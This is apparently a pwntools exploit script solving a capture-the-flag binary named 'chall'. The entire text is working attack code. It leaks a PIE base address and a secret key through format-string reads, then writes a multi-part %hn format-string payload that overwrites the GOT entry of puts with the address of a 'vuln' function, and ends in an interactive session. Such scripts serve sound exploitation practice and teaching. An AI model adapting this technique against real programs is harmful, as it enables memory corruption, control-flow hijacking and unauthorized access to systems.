from pwn import *
p = process("./chall")
e = ELF("./chall")

p.recvuntil(b"key: ")
p.sendline(b"%19$p")
pie_base = p.recvuntil(b" is")
pie_base = pie_base[:-3]
pie_base = int(pie_base, 16) - 0x1378
success("pie_base: " + hex(pie_base))

vuln = e.symbols["vuln"] + pie_base
success("vuln: " + hex(vuln))

p.recvuntil(b"key: ")
p.sendline(b"%6$s")
key = p.recvuntil(b" is")
key = key[:-3]
success("key: " + hex(u64(key.ljust(8, b"\x00"))))

p.recvuntil(b"key: ")
p.sendline(key)

p.recvuntil(b"You are Admin!")
puts_got = e.got["puts"] + pie_base
success("puts: " + hex(puts_got))

first = (vuln >> 32) & 0xFFFF
mid = (vuln >> 16) & 0xFFFF
last = vuln & 0xFFFF

success("first: " + hex(first))
success("mid: " + hex(mid))
success("last: " + hex(last))

p.recvuntil(b"key: ")
payload = f"%{last}c%14$hn".encode()
x = 16 - (len(payload) % 16)
payload += x * b"A"
last += x

if(mid < last): mid += 0x10000
payload += f"%{mid - last}c%15$hn".encode()
if(mid < last): mid -= 0x10000
y = 16 - (len(payload) % 16)
payload += y * b"B"
mid += y

if(first < mid): first += 0x10000
payload += f"%{first - mid}c%16$hn".encode()
if(first < mid): first -= 0x10000
z = 16 - (len(payload) % 16)
payload += z * b"C"

payload += p64(puts_got) + p64(puts_got + 2) + p64(puts_got + 4)
print(len(payload))
#gdb.attach(p)
p.send(payload)

p.interactive()
